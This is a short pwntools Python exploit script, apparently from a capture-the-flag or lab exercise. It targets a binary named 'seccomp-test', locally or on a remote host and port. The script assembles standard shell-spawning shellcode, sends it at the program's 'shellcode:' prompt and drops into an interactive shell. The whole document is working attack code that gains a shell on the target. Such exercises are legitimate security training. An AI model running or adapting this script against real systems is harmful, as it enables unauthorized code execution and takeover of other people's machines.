#!/usr/bin/env python3

from pwn import *

context.arch = 'x86_64'
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE \
	else process("./seccomp-test")

sc = asm(shellcraft.sh())
io.sendlineafter(b"shellcode: ", sc)
io.interactive()